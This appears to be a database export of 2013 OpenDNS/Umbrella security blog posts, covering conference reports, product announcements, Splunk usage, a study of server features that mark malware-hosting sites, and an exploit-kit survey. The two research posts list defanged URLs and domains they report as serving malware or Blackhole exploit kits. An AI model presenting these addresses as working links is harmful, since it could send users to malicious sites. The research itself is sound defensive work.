as master computation, sharded aggregators etc. We here borrowed the illustration of the single-source shortest path algorithm in Giraph. To get started, check out Giraph’s website.\n\n\nLarge-Scale Graph Clustering in MapReduce and Beyond\nDr. Vahab Mirrokni from Google research, New York presented a nice clustering scheme on large-scale graphs. Clustering is very useful and is often the first exploratory step in unveiling hidden grouping structure of a big clump, requiring little prior knowledge of the data segments. It is obviously commonly seen in social network analysis, customer segmentation studies.\nIn the security domain, papers [1,2] were published where network traffic patterns were studied with clustering techniques. So back to Dr. Mirrokni’s talk, the focus is again to solve the clustering problem efficiently when the old solutions are challenged by the scale of the data. This is the overhauling slide for his talk, and below are the security-related papers that you may put on your reading list.\n\n1. “Behavioral Clustering of HTTP-Based Malware and Signature Generation Using Malicious Network Traces”, Roberto Perdisci, Wenke Lee, and Nick Feamster, USENIX NSDI 2010\n2. “BotMiner: Clustering Analysis of Network Trafﬁc for Protocol- and Structure-Independent Botnet Detection”, Guofei Gu, Roberto Perdisci, Junjie Zhang, and Wenke Lee, USENIX Security Symposium, 2008\n\n \nGraphBuilder 2.0\nDr. Theodore Willke from Intel Labs, presented GraphBuilder 2.0, the scalable graph construction library for Hadoop developed at Intel. GraphBuilder is open source and written in Java which makes it easy to integrate with Hadoop Mapreduce. Its main advantage is that it frees domains experts from the complexities of preliminary graph construction, such as graph formation, tabulation, compression, transformation, partitioning, output formatting, and serialization.\nGraphBuilder answers the need for an ETL (extract, transform, and load) sequence specific to large scale graphs. After the initial phase of parsing the data sources and extracting features of interest, the library user can build the edge list for the graph, and use any of the built-in functions like term frequency, or word count. In the next phase, the user can deduplicate edges, remove leaf nodes, self-loops, or transform a directed graph into an undirected one.\n\nIn the graph compression phase, dictionary-based compression and simple MapReduce compression algorithms are applied which are empirically efficient at conserving memory and storage. Next, comes the partitioning phase which uses efficient heuristics such as the balanced p-way vertex cut scheme. Most large scale graphs that appear in real-world problems are arbitrary (such as the web graph, or social networks) i.e. they are far from being regular or truly random. The problem of balanced partitioning of arbitrary graphs such as power-law graphs is NP-hard, hence the importance of using partitioning heuristics that are efficient in practice.\n \nThe event featured another 10 to 11 equally great talks and a dozen poster demo sessions, all informative and technically inspiring. The compact single day schedule turns out to be a very efficient way to share, learn and connect. At the end of the day, each attendee got a copy of the newly released “Graph Databases” book from O’Reilly and sponsored by Neo4j, something that would definitely help those who would like to dive a bit deeper into another aspect of big learning with graphs.', 'Big Data;Open Source;Security Research', 'https://umbrella.cisco.com/blog/2013/07/05/graphlab-2013-2/');

As with many of the features we deliver, these improvements were motivated by the feedback of both the domain tagging community and our users.\nSexuality Category\nThe sexuality category includes websites that, “provide information, images or implications of bondage, sadism, masochism, fetish, beating, body piercing or self-mutilation.” And that won’t change with this update.

For many, public Wi-Fi access is accompanied by the need for an acceptable use policy, whether to limit bandwidth consumption or create a family friendly environment.\n\nThe evolution of Wi-Fi hardware has made it easier to deploy and manage wireless access, but more difficult to rely on traditional Secure Web Gateways for Web filtering. At a recent webcast, we shared how Umbrella Hotspot Edition, a lightweight cloud-based Web filtering solution, solves that problem. Not only is enforcing acceptable use through the cloud easier, it can also eliminate performance issues and reduce administrative overhead.\nWe had more questions during the webcast than we had time to answer, so I sat down with OpenDNS product manager Dima Kumets to get some additional insight. Below are the top five most-asked questions from the webcast.\n1. How does Umbrella Hotspot Edition enforce acceptable use on all devices that connect to our company’s Wi-Fi network?\nDNS is an essential Internet protocol that is used in every single Internet connection. When users ask to connect to Amazon.com while in your store, for example, you can use DNS to return that request with either the website itself, or a block page. Since DNS is used by all devices, from laptops and tablets to iPhones and Androids, it’s automatically enforcing policy when these devices are connected to Wi-Fi.\n2. How do you prevent guests from bypassing the service by using other DNS/ports/VPN?\nOccasionally a user will try to bypass the Umbrella Web filtering service by switching their DNS to another provider. This can easily be prevented by setting your router to block all port 53 traffic except traffic going to the OpenDNS resolvers. Umbrella also features a Proxy/Anonymizer category in the Content Filtering settings, which will block further attempts to bypass your appropriate use policy.\n3. Does this work with all Wi-Fi access points?\nYes, Umbrella Hotspot Edition can be used with all Wi-Fi access points. The cloud-based delivery mechanism allows seamless and swift deployment – imagine the ability to deploy Web-filtering to every one of your hotspots in just one day, without having to leave the office. That’s the power of cloud-delivered security.\nTo make Umbrella deployment even easier, OpenDNS has partnered with both Aruba and Cradlepoint; we’ve integrated our management center into their standard interface, allowing you to save time by covering everything from one centralized dashboard.\n4. Can this also work for an enterprise’s guest Wi-Fi or is it just for public Wi-Fi?\nUmbrella Hotspot Edition is built specifically for guest and public Wi-Fi deployments – the effortless implementation, minimal administrative overhead, and low cost make it an ideal solution for the retail and hospitality industries, especially those with numerous locations. In addition, enforcing the same rules for both guests and employees is often a recipe for disaster – one side or another won’t be getting the policy they need. To ensure all parties have the appropriate level of filtering, consider using Umbrella Enterprise for your internal networks.\n5. What does the process look like to get started on a trial?\nGetting started on a trial is easy, since Umbrella is a cloud-delivered service and you don’t actually have to install or download anything. A quick chat with one of our reps, and a simple configuration change in your DNS settings, and you can be up and running!\nAs you can see, getting started with Umbrella Hotspot Edition is almost as easy as deploying it. If you’d like more information, be sure to watch the on-demand webcast.

INSERT INTO `opendns` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (1652, 'Four standout trends at the Gartner Security and Risk Management Summit', 'OpenDNS Team', 'June 19, 2013', 'Last week Gartner held its annual Security and Risk Management Summit outside of Washington, DC. The event draws hundreds of CIOs, CISOs, and decision-makers in IT and security from organizations all over the world. The conference schedule was aggressive, covering a broad range of important and controversial topics in security and risk management. We attended both high-level and prescriptive “how-to” sessions, and saw four important themes emerge. Here’s a closer look our top takeaways from the event:\n1. There’s no such thing as a perfect security solution.\nIn almost every session we attended, Gartner analysts were sure to make one thing clear: There’s no magic bullet for fighting off threats. If a business purchases every security solution on the market, it’s still no guarantee that its data will be protected from APTs or hackers. While this concept alone isn’t new to IT, Gartner’s suggestion for how to respond to it was enlightening.\nInstead of working to check off boxes on a list of security layers (firewall, secure web gateway, antivirus, etc.), or rushing out to buy the latest and greatest solution, IT and security teams would be more effective if they focused more on understanding business objectives and introducing stakeholders to the risk continuum. Raising key decision makers’ awareness of the chance of a security event, and the impact it could have on those business objectives, is an essential step toward getting a budget for a new security solution.\n2. Legacy security vendors and enterprises alike are looking to startups to fill the innovation gap.\nWe’ve talked often on this blog about how legacy security vendors are struggling to keep pace with today’s technological changes. During his keynote on Tuesday, Symantec CEO Steve Bennett explained that the future innovation path of the security giant is dependent on partnerships and integrations. When pressed further, he was candid, saying, “We bought growth. We never asked our engineers to be innovators.”\nSo who will innovate? During a panel discussion later that day, leaders of security start-ups like Bromium and CrowdStrike shared insight on why startups are more equipped to serve the current and future needs of the market. Put simply, these agile young companies aren’t held back by history. There’s no innovator’s dilemma keeping them from building and adapting products to solve new problems. And the analysts are now hearing more enterprises ask which companies beyond the old guard they should be evaluating.\n3. Securing BYOD is really hard, and no one has all the answers.\nPutting an effective security strategy in place for corporate-owned mobile devices is hard enough, so attempting to apply universal policies to employee-owned devices can seem downright impossible. Acknowledging that it’s an uphill battle, Gartner Analyst John Girard suggests scoping the initial mobile device policy first from the perspective of what’s possible for BYOD, and concentrating policy around the platform that the majority of users choose today (for many organizations this is iOS).\nAnalysts suggest that using application control and MDM will become increasingly effective for securing devices owned by the business. Securing employee-owned devices, on the other hand, requires a solid investment in educating and partnering with end users. And of course, making trades. Analysts also suggest educating users on the broad impact of lost data or productivity, and shaping security in the context of employee rights and responsibilities.\n4. Whether threats are advanced and persistent, or just annoying, we need to adjust the way we secure against them. \nMany are guilty of broadly describing cyber attacks as Advanced Persistent Threats, when perhaps we more accurately mean to say malware distribution networks or botnet infections. So it was great to see several of the presenters at the summit exploring a deeper analysis of the much-hyped phrase. Dave Monnier, Security Evangelist at Team Cymru, suggested we shift from focusing on the idea that these attacks are advanced (they’re not, he says) and start focusing on their persistence. He explained, “You can put in multiple layers of prevention technologies, but you need to spend more time on detection and mitigation. No matter how tall a wall you build, something will eventually scale it.”\nGartner Analyst Lawrence Orans expanded the conversation, suggesting that as a security community we’ve got to do better than complacently expecting traditional security solutions to universally protect against threats. The issue isn’t the evolution of the threat itself, it’s where the threat makes an attack – opportunistically leveraging our once-clean device supply chain, and our massive cloud networks. Orans suggested we’d be well served to prioritize securing mobile devices that leave the secure corporate environment and heighten security for cloud networks.\nWhat are your thoughts on security at large, legacy security vendors vs. startups, BYOD, and advanced persistent threats?

But sometimes the process of creating a happy customer is dependent on some behind-the-scenes work. This work can manifest itself in many ways, but often it is driven by our support team, who engage with customers on the front lines and are in a unique position to spot trends before they become pervasive. Earlier this year we had an idea: what if we could broaden the scope of how we make customers happy by dedicating a group of engineers to focus strictly on building solutions that more holistically address customer satisfaction? Shortly thereafter, the A-Team was born.\n\nMost engineering teams build products and drive towards completion of features, and we have those teams here, too. Like the crew that works on our Umbrella Dashboard or upcoming product launches. But the A-Team is different, we work tirelessly toward one goal: improving all things customer-related. This can be a bit of a moving target, and we know that, but it is our job to keep pace with the ever-changing needs of our customers. We can warrant taking on projects that require anywhere up to two weeks to complete, so long as they make a direct, positive impact on our customers. These projects include bug fixes and feature requests coming through support and sales, optimizing customer facing systems like our blog, and one-off projects that help bring on new customers.\nOur team, which is comprised of five engineers, a quality analyst, a support pro, and myself, the product manager, is also different from traditional engineering teams because we’re very interrupt-driven. We kick off each iteration with the understanding that our plan for the week is tentative and that as a team we must stay agile, given that issues requiring immediate attention may crop up at any time — this does keep things exciting. As a result, we’re constantly working to find the right balance between quick fixes and larger projects, to improve our efficiency and maximize our customer impact.\nAs you might imagine, there’s no shortage of options as we look at which tasks to take on next. Accepting and prioritizing requests can be a bit complicated, but we do a few things to aid us in the process of identifying which projects take precedence over others. We ask employees that file tickets with the A-Team to make their case for their request by specifying the potential customer impact or business value. This, along with our estimate of the engineering time required to complete the task, ultimately determines where the request is prioritized. We do all of this to ensure we are get the most value out of our work, while remaining focused on the customer. To help set expectations, the following qualifiers are also assigned to each A-Team request filed:\nBlocker – Stop everything, fix this now, skip lunch and don’t go home!\nCritical – Fix this in the next day or two, ASAP.\nHigh – Default, will fix in the next 1-3 weeks (depending on our workload).\nMinor – Stuff that would be cool but isn’t critical, and it’s okay if we get to in 4-6 weeks.\nTrivial – “Could you do me a favor, this will only take a second…”\nOccasionally we’ll push a project to another team because it doesn’t fall within the scope of the A-Team. Sometimes, all things considered, we have to say no to requests. It isn’t always easy, but ultimately it allows us to more efficiently serve a greater volume of high-impact customer requests. Our team has been able to accomplish some great things in just a few months, including the option for Umbrella customers to apply policy on Internal Networks, and the soon-to-be-released two-factor authentication.\nWe use a variety of metrics to track our efficacy as a team, these include: Net Promoter Score, customer satisfaction score, churn, and customer lifetime value. And our favorite, the stories happy customers share with us. We’d love the opportunity to hear from you.

Our data show that malicious domains typically use one of nine different “Server:” header signatures. A staggering 95.27% of domains serving malware match these signatures, whereas benign domains match the same signatures only 17.23% of the time.\nSome websites are also taking advantage of Content Delivery Networks (CDNs). However, we couldn’t find any domains currently serving malware using Akamai, Bitgravity, Cachefly, Chinacache, or Limelight.\nThough it’s not inconceivable, one can assume that websites using one of these CDNs are much less likely to be malicious.\nHowever, 0.2% of malicious domains are using Cloudflare, and 0.1% of them were using Microsoft Azure.\nX-Powered-By header\n\nThe next thing we examined was the “X-Powered-By” header, which is also an identifier for the software running a web application or site.\nAlthough the difference is not significant, Plesk is found more often on compromised websites than benign ones (5.67% vs 1.49%). But perhaps most important to note here is the presence of a “X-Powered-By” header which doesn’t indicate the presence of Plesk, ASP, or PHP.\nWeb servers running Ruby (Rack), NodeJS (Express), Mono, and Java-based application servers (Jboss/Tomcat) are clearly less used for malware distribution than other software stacks.\nCookies\nCookies are a good indication of whether a website needs to somehow track a user, and also a good indication of what framework or application is running.\nIn order to ignore cookies sent by third-party services, like ad servers, we only analyzed the home page of each website, and discarded cross-domain content.\n\nApproximately half of the visited benign websites don’t serve any cookies. Compare that to 77.58% of malicious websites that don’t serve cookies.\nBenign websites also tend to have a higher diversity of cookie names than malicious websites.\nThis can be partly explained by the fact that cybercriminals will often target applications that are easier to compromise, and hosting services that are malware-friendly often offer similar operating systems and software stacks.\nWordPress\nNot all WordPress instances are sending cookies at the first visit.\nA more reliable way to detect sites powered by WordPress that inspect cookies is to look for specific files. The one tested here is /wp-includes/wlwmanifest.xml.\n\nAccording to this test, no less than 19.50% of malicious/compromised sites are running WordPress.\nBut WordPress is also omnipresent on sites that haven’t been compromised (yet): the file was also found on 13.92% of the benign web sites from our training set.\nLast-Modified\nLooking at the “Last-Modified” header when requesting the home page is a good way to see whether a website is regularly updated.\nPlotting the CDF of both classes of domains shows that sites whose home page hasn’t been recently updated have a higher likelihood to be malicious or compromised than sites containing more dynamic content.\n\nContent-Length\nThe length of the content is also a useful feature. I examined HTML code for the home pages only of these sites.\nIn this training set, none of the benign examples served HTML code larger than 2 Mb on the home page, at least according to the Content-Length header.\n\n\n\nLarge HTML code was always found on sites directly serving malware payloads, and on compromised sites, serving obfuscated Javascript leading to an exploit.\nA few examples as of today:\nhxxp://portail-bassin-arcachon.com 11,255,479 byteshxxp://portail-cote-azur.com 9,542,640 byteshxxp://location-mer.eu 8,437,761 byteshxxp://portail-cote-vendeenne.com 6,934,555 byteshxxp://portail-toulousain.com 6,914,263 byteshxxp://grupokarion.com 6,272,172 byteshxxp://portail-sologne.com 6,079,756 byteshxxp://unoshn.com 4,373,545 byteshxxp://portail-vallee-des-rois.com 4,355,293 byteshxxp://lacajareiki.com 2,854,292 bytes\nSSH\n\nMore than 20% of web servers are also running an SSH server on the same IP address. This holds true both for benign and malicious servers.\nFTP\n\nThe figures are quite different when it comes to FTP servers.\nNo less than 36.65% of web servers serving malicious content are running an FTP server. That’s nearly twice as much as servers for which we didn’t observe any malicious activity (18.57%).\nIn both cases, Pure-FTPd is the most popular FTP server software, with a 46.5% share, mainly due to it being shipped with Cpanel.\nPOP\n\nA POP server usually doesn’t share the same IP as a benign web server. Only 13.3% of benign web servers are also listening to port 110.\nHowever, POP servers run simultaneously on 23.15% of malicious web sites.\nThe distribution of the POP server software is similar in both benign and malicious cases, with Dovecot being by far the most popular option.\nSMTP\n\nAs expected, SMTP servers also tend to be more frequently found on web servers hosting malicious content than on benign ones: 25.03% vs 17.49%.\nUsing this data for classification\nAfter analysis, we then used this data to extract simple binary features:\nServer: *Apache*\nServer: *nginx*\nServer: !*(IIS or Apache or Nginx or Litespeed or Oversee or Lighttpd or ATS or Varnish or Tengine)*\nServer: *Akamai*\nX-Powered-By: *(Plesk or ASP or PHP)*\nThe presence of cookies\nSet-Cookie: *(wordpress or ci_session or uid or PHPSESSID or PHP_SESSION_ID or virtuemart or VisitorID)*\nLast-Modified date > 1 day\nContent-Length >= 2,000,000\nThe presence of an FTP server\nThe presence of an SSH server\nThe presence of an SMTP server\nThe presence of a POP server\n\nA decision tree trained with these features on 2/3 of our examples leads to the following ROC curve:\n\n\nThis classifier is simple and extremely fast, but it clearly doesn’t perform well enough on its own for our security needs. Furthermore, collecting test data is a network-intensive operation.\nHowever, we have many models currently tagging domain names as suspicious or not according to different algorithms.\nSome of these domains have a very high precision and are added to the list we are blocking after a quick manual review. For instance, newly registered domains acting as fast-flux fall into this category.\nOutput of other models need extra votes before we are confident enough to blacklist them and thereby protect our customers. And this new classifier is going to play a significant role in this regard.', 'Big Data;Security Graph;Security Research', 'https://umbrella.cisco.com/blog/2013/06/13/server-side-software-and-malware-analysis/');

These techniques fall in the categories of anti-disassembly, anti-debugging, obfuscation and anti-virtualization.\nPlaso: reinventing the super timeline – Kristinn Guðjónsson, Google\nKristinn presented the timeline analysis tool Plaso which automates the correlation between multiple data sources into a single timeline. A Python-based back-end engine, Plaso is very useful for parsing various log files and forensic artifacts from computers and network equipment to produce a single correlated timeline.\nReverse Engineering – Jimmy Wylie, Fortego\nJimmy hosted a workshop style presentation that gave a thorough outline of reversing basics, tools, and technologies (CPU registers, assembly, debuggers, IDA Pro, static analysis, behavioral analysis, etc) and concluded with hands-on reverse engineering exercises.\nAfter the conference, it was obviously time to have some fun, and New Orleans is certainly not short on that. The OpenDNS crew enjoyed local specialties such as turtle soup, exploring the French Quarter, and gator foodstuffs.\nIf you want a challenge, you should stop by the Pepper Palace. There, I had the misfortune to try the “hottest sauce in the universe 2nd dimension” (sic). Any sauce that requires legal documentation before you try it is not fooling around – as I learned the hard way.\nOverall, BSides NOLA was a great experience, and an opportunity for me to meet many skilled and passionate security professionals.

We recently made a hugely important hire: Jeffrey Samuels, our first-ever Chief Marketing Officer. Jeff is no stranger to the cloud. He previously served as CMO at GoGrid and held leadership positions at Neustar and UltraDNS. Although CMO duties keep him busy, I grabbed a few minutes with Jeff to get his thoughts on where OpenDNS is heading, and how Umbrella is transforming Web security.\nYou’ve known David Ulevitch (OpenDNS CEO) for many years. Why was it the right time for you to join OpenDNS now?\nJS: OpenDNS has reached a point of growth where the very atmosphere is charged with energy. There’s a noticeable shift when you walk in the door; when you talk to customers or any employee – there’s an excitement, an anticipation, the expectation of doing something incredible in the security market. David has already built a tremendous company. He has connected with the right people, the right investors, the right executive team, and amazing employees that are 100% focused on making a difference in the market. The platform the OpenDNS team has been building since 2006 is part of a technology story that’s now flourishing in the enterprise space. I wanted to be a part of that.\nWhat do you think makes Umbrella, OpenDNS’s line of cloud-delivered security solutions, stand out from other Web security solutions?\nJS: It’s not just about a product. Our entire approach to security is unique, especially from our competitors. Enterprises of all sizes have security needs that are rapidly changing, and they need to incorporate protection at levels they’ve never seen before. The threats have proliferated and employees are now very mobile. With our cloud-first delivery mechanism, there are two things to consider. First, is ubiquity. Everything that OpenDNS and its Umbrella line offers has a cloud foundation, which is essential to protecting endpoints and end users wherever they are, 24/7. Second, is the level of security we provide. We are equipped to analyze data in real time and utilize our engine to predict security issues and threats as or before they appear. That’s an important technological hurdle we know is necessary to  protect our customers from today’s cyber threats.\nOpenDNS has always been an innovative company. Why is our cloud-first approach transforming the Web security space, and where do we go from here?\nJS: Put simply, we are now in an era where organizations are always going to need Web security. The work landscape is changing; people aren’t just sitting at their desks. Not everything is going through the firewall, and there are serious threats appearing every day that can harm your enterprise, whether it be malware, phishing, or botnets. Right now, businesses are trying to adapt their existing security technologies to fit this new style of working. With Umbrella, we offer businesses a better way: easy-to-manage security-as-a-service that will protect employees wherever they go. Our technology and platform can address these risks, and the flexibility of the cloud allows us to evolve and face tomorrow’s threats with agility. So from here, we heighten our focus on  strengthening the efficacy and performance of our service, and continue to augment the features and visibility we deliver to customers.\nOur team is working on some major releases this year. What is the biggest challenge we have to overcome when it comes to misconceptions about OpenDNS or Umbrella?\nJS: OpenDNS is blessed with a tremendous reputation as being a DNS, infrastructure, cloud and security provider to millions. Fifty million end users are benefitting from our services every day. One of our greatest challenges (and opportunities)  is to translate this success to businesses. We have to reinforce the message that cloud-based security services are necessary today and essential for future protection, and that Umbrella enables businesses to secure their end users, end points, and devices globally.\nIf you could tell potential customers just one thing as they look at the security market, what would it be?\nJS:  I would say the most important thing is to educate yourself – about the threats that exist, about the security you currently have, and about the security you’re going to need. Education for us is foundational: making sure our clients and businesses around the world know how to protect themselves and ask the right questions about security.\nYou can learn more about Jeff and the rest of our leadership team here.', 'Announcements;Umbrella', 'https://umbrella.cisco.com/blog/2013/05/31/meet-jeff-samuels-opendns-chief-marketing-officer/');

For starters, we hired an engineering team committed entirely to enabling our MSP partners, and we’ve doubled our MSP-focused sales team. But I’m most excited about our latest release: the all new Umbrella MSP Console. I think you will be, too.\nOur MSP partners useUmbrella’s malware protection to improve margins by dramatically decreasing the time they spend cleaning up infections on customer end points. So when we began building the new console, we asked them what features would best enable them to optimize their operations and improve margins on monthly recurring revenue.\nThe new console has everything MSPs asked us for: Seamless, on-demand deployment and provisioning? Check. Monthly billing to align with your business model? Check. Volume pricing for a license pool you own and can manage in seconds? Check. Ready-made scripts for RMM deployment? Check. Malware, botnet and phishing protection that follows users wherever they work, even on laptops that roam off the corporate network? Yep, we’ve got that, too.\nBut you don’t have to take my word for it. Here’s what early adopters of the new Umbrella MSP Console are saying:\n“The new Umbrella MSP Console is drop dead simple. It allows us to seamlessly onboard our clients, and protect all their networks in under 5 minutes.  With Umbrella, we can extend powerful malware protection to laptops that leave the office through a simple deployment using our RMM software. It’s great that we can protect our clients’ employees no matter where they use their devices.” – Dave Bell, President of Cyber Solutions.\n“As promised, the new Umbrella MSP console makes it easy to manage cloud-based malware protection for all of our clients. It’s wonderful that OpenDNS has adapted to do business the way MSPs do by offering monthly billing and volume pricing, because it’s essential that we offer this level of security for our clients, and help them prevent productivity loss associated with malware infections.” – Kyle Harsh, Lead Network Engineer at PC Network Solutions\nYou can get a demo of the new console at our upcoming webcast, or learn how managed service providers are improving margins by reducing malware infection time by 80% beyond traditional antivirus alone.\nEasily view and modify licensing across all customers.\nAdd or modify customers and seat counts in seconds.\nThis release is just the beginning of our increased investment in the MSP program. Now that our dedicated MSP engineering team has built the foundation, we’ll be able to consistently roll out new functionality and more easily integrate with tools you’re already using today.

Since it was such a great experience for our team, we wanted to share insight on our process, as well as a look at what went well and what we’ll be sure to improve on next time.\nPlanning\nPlanning the code-a-thon was pretty simple. We encouraged employees to work on a self-selected project for 24 hours, and only had a few rules:\nCode-a-Thon starts at 10:00 AM Thursday ends at 10:00 AM Friday\nYou must work in teams of 2 +\nNo posting of code or projects to live servers allowed\nThe project should be somewhat aligned to our space or our company\nIt’s okay to create Open Source tools, but they must be approved before posting publicly\nAfter the 24-hour period was up, participants would be asked to demo what they for the rest of the teams. Initially, we opened the Code-a-Thon up to all engineering, operations, research, and product management teams.\nSelecting Projects and Teams\nWe started promoting the Code-a-Thon internally a few weeks before it kicked off. That gave our team members time  to start thinking about their projects and to brainstorm on teams and ideas. We created a board on Trello that listed project ideas so employees could add themselves to teams, or collaborate. At our weekly company-wide meeting later that week, we announced that plans for a Code-a-Thon were underway. We were pleasantly surprised to find that employees from outside of our technology groups were interested in participating, so we opened up the challenge to everyone.\n\nKick off @10:00 AM Thursday\nThe morning of the Code-A-Thon we gathered all the participants to go over details. I reiterated why we were doing this, the rules of engagement, and shared details on the fuel we’d have available – countless energy drinks, a steady supply of deliveries from favorite local eateries, and plenty of amenities like blankets and toothbrush kits.\n\nTeamwork\nOnce we kicked things off, our teams got right into it. Since we have engineers spread out in both our San Francisco headquarters and our Vancouver, Canada office, lots of our teams got started by grabbing a conference room and setting up Google Hangouts.\nWe also had a few last-minute participants, but our team is really collaborative, so it wasn’t an issue for the teams to add another person or two. Many of the teams started and ended with the same project idea, but there were quite a few that changed their ideas after early brainstorming. We even saw movement between the teams during the event, as different projects required different skills.\n\n\n\n\n\n\nLate afternoon on Day 1 we decided to have an impromptu ping-pong tournament. It was nice to break up some of the coding.\n\n\nMany participants worked through the entire night on their projects, some slept a few hours, and others actually finished early! Luckily it was a very nice night in San Francisco, so some of us worked on the rooftop under the moonlight.\n\nAt midnight we met on the roof to toast the work that had already been done, and then we quickly got back to our projects.\n\nDemos\nAs morning came, the teams starting wrapping up their projects and discussing how they were going to demonstrate what they had accomplished. At 10:00 AM the teams met up to present, and each were given 10-15 minutes to announce their team, what they worked on, and show a demo. We were able to stream the demos for both of our offices, and record them for the people who weren’t able to watch live.  I was impressed to see how excited our crew was to see what others had built, even after many worked throughout the night. We also had a ton of folks from other departments who came out to watch the demos.\nIt was quite amazing what the teams were able to accomplish in just 24 hours. There wasn’t a single team that didn’t finish enough to show a demo. After a few hours the demos wrapped up and we celebrated over a delicious lunch. Employees that participated in the code-a-thon were free to get some final work done, wrap up, and the go home and sleep as needed.\n\n\nAlthough we didn’t see the Code-a-Thon as a competition, we thought it was important to acknowledge the amazing work that was done. We set up an anonymous survey where participants could vote on the projects. Voting rules were simple: you can’t vote for your own team, and you can only vote once per category.  The categories included hardest technical challenge, most creative, best demo, and best overall project.\n\nRetrospective\nWhat went well.\nTeamwork and collaboration across teams.\n100% participation from all engineering teams and even some from outside engineering.\nQuality, quality, quality. The quality of projects that were delivered in just 24 hours was amazing.\nWhat did not go well.\nNot enough whiteboards. We have whiteboards in all of our dozens of conference rooms, as well as several mobile whiteboards, we still needed more! \nDemo webcast had some problems with streaming.\nWhat we can improve upon for next time.\nSince the Code-a-Thon was a huge success, we definitely will be having more of these for internal employees and we are even thinking about one day inviting outside guests. Some items that we would like to improve for next time are:\nGive the engineers more advance notice on when we will run the Code-a-Thon\nInvolve more groups across the company (even those who are less technical) to participate. The principles of a Code-a-Thon can be applied across all disciplines. \nMore whiteboards! \nMore sticky notes!\nShipping Projects into Code\nAlthough we had a rule that no team was allowed to push code into production during the Code-a-Thon,  we are now are in the midst of polishing up some of them and pushing them into production. The first one is two-factor authentication and is available for testing now. Two-factor authentication is becoming more important as credentials theft gets more popular. We will be writing a more complete blog on this feature soon, along with several others we have in the works.\nScreenshot of two-factor authentication:\n\nWe highly recommend hosting a Code-a-Thon as a means to create teamwork, excite engineers, and promote innovation. We’ve found that having just a few rules is the surest way to let creativity prevail.

We’ve shared in previous posts how our team applies proprietary algorithms to data from the OpenDNS Global Network, but we’re constantly on the hunt for  easy-to-use data platforms that allow for real-time and interactive data visibility.\nThat’s why we wanted to share a bit about our experience with Splunk, a big data management system that provides fast machine data parsing, indexing, searching and data analyses. The GUI interface, dashboard and availability of security-related add-ons make for a neat out-of-the-box solution for enhanced data visibility.\nSplunk Basic Usage\nInstallation of Splunk base is rather straightforward. Check out their official docs for installation instructions. When you’re getting started, these are some of the basic ways to use Splunk: add data to splunk (data input), search, delete, data aggregation, data transformation, and charting.\nIf you’re using customized data, you’ll likely find input to be the trickiest part. That’s where Splunk will have to figure out the correct data format, and properly parse it to extract fields. Splunk tries to automatically break the raw blob of textual input into EVENTS based on default or customized event breaking settings, and recognize the timestamp for each event. These settings can be customized both via Splunk GUI or command line interface (CLI). Make changes props.conf file to tell Splunk how to treat your data with correct configurations.\nAn example of extracting tab delimited fields from my input data:\nFor data queries and other operations (aggregating, data transforming etc.), Splunk’s pipe syntax seems pretty straightforward.\nThe following query that maps out a number of IP addresses that fits certain criteria serve as a good example of basic query syntaxes. The example requires the geoIP mapping app provided by Maxmind, and amMap, a mapping app.\nsourcetype=mute* | rex \"(?d+.d+.d+.d+)\"| search ip!=192.168* ip!=0.0.* ip!=10.*|  stats count by ip | eval count_label=\"Event\" | eval iterator=\"ip\" | eval iterator_label=\"IP\" |  eval zoom = \"zoom=\"334%\" zoom_x=\"-128.58%\" zoom_y=\"-113.11%\"\"| eval movie_color=\"#FF0000\" | eval output_file=\"home_threat_data.xml\" | eval app=\"amMap\" | lookup geoip clientip as ip | search client_country!=^$ | mapit\nSplunk data forwarding and receiving\nInstall the universal forwarder if your have remote data. The universal forwarder gathers data from servers where your input data reside and forwards them to your main Splunk server for indexing and searching.\n./splunk add forward-server [splunk server:port]\n/opt/splunkforwarder/bin/splunk add monitor /path/to/app/logs/ -index main -sourcetype %app%\nAt the same time, enable receiver – the main Splunk server and indexer by going to Splunk GUI, in forwarding and receiving->add new -> TCP port [port]\nTo troubleshoot the deployment, check these internal logs at the receiving indexer:\n$SPLUNK_HOME/var/log/splunk/splunkd.log\n$SPLUNK_HOME/var/log/splunk/license_audit.log\nUse cases for Splunk security apps\nSplunk base has a set of charting choices. In the following example, we made a pie chart of user agent distribution of our mobile clients data.\n\nSnort app has been a great tool for quick network threat monitoring and alerting. We can easily retrieve all the entries that triggered snort, and perform in-depth investigations given the source IP addresses and contextual network data.\n\nSnort and amMap makes use of Maxmind’s geo-ip mapping to give us an instant global look at the threat’s scale and spreading patterns.\n\nConclusion\nWe have yet to explore Splunk’s other interesting capabilities, such as real-time correlation making and alerting, or its distributed system deployment scheme (with Hadoop integration). We’ve spent lots of time with Hadoop and Hbase, which are largely back-end systems. As far as our primitive use of Splunk goes, it seems to serve quite well as a front-end portal for internal search, query and reporting. Data parsing for customized data is not as intuitive. It would be great if it provided pipe-like syntax for data input, as well.', 'Big Data;Security Research', 'https://umbrella.cisco.com/blog/2013/05/24/big-data-driven-security-with-splunk/');

We leverage these technologies to discover domains before they are used in the wild, with the goal of ensuring that customers using Umbrella by OpenDNS receive the best protection possible. But given the lofty nature of this claim, we also seek to expose our research and findings so that it’s clear how we accomplish these goals. For example, in a previous post, we explored the relationships between dynamic DNS domains and malware sites. In this blog, we look at sample malicious URLs to determine the most frequently used exploit kits, and discuss some of the notable features of these URLs’ domains.\nAn Overview of Exploit Kits\nExploit kits are an extremely efficient and popular way of distributing malware to gain control of people’s computers. Let’s quickly review how exploit kits work: First, a user’s traffic is redirected to a server that runs an exploit kit Web application. Then, the kit detects existing vulnerabilities in the software or operating system running on the user’s machine. The kit exploits these vulnerabilities by stealthily dropping a malware payload (directly or via further redirections) on the user’s computer. As a result, the attacker takes over the user’s machine. The ecosystem of exploit kits is quite vast, and these kits can differ technically or with regard to their business model. A good poster showing the common exploit kits of 2012 is available on deependresearch.org site.\n\n[Exploit kits poster published on http://www.deependresearch.org/2012/11/common-exploit-kits-2012-poster.html]\nAn Umbrella Security Labs Exploit Kit Study\nTo perform a study on how exploit kits are behaving, we take random samples of malicious URLs from our database for a period of 7 days, and use Yara (more on the tool at the end of this post) rules to detect known exploit kits URLs and report the percentage of URLs for each exploit kit. We also analyze the domains of the URLs for any noticeable features.\n\nIn the figure above, we see the top 3 most frequent exploit kits in the URL samples. As expected, Blackhole is the most prevalent followed by Red kit, then Safepack.\nWe then take as an example, the URLs that are related to Blackhole and further investigate their domains using the Umbrella Security Graph (Sgraph). For the example domain dfudont[.]ru, Sgraph shows in the figure below that it is fastflux, hosted on an ASN with a suspicious score, has a low C-Rank and that the domain has been assigned a low score by our classifier.\n\nDetails on a Sample of Blackhole Domains\nDomains such as jindalo[.]ru, ijsiokolo[.]ru, 